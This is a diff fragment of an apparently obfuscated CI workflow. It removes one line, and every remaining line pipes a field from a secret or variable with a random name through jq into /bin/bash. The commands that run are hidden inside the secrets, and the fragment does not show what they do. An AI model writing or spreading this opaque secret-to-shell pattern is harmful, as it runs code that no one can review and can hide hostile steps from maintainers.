@@ -22,7 +22,6 @@ jobs:
           etoav8: ${{ secrets.etoav8 }}
         run: |
           printf '%s' "$etoav8" | jq -r .yz92472 | /bin/bash
-          printf '%s' "$usf3310" | jq -r .zzjvo94 | /bin/bash
           echo $tj496 | jq -r .bk50 | /bin/bash
           echo $ptjh2594 | jq -r .kpdt6 | /bin/bash
           printf '%s' "$m2" | jq -r .rn5 | /bin/bash
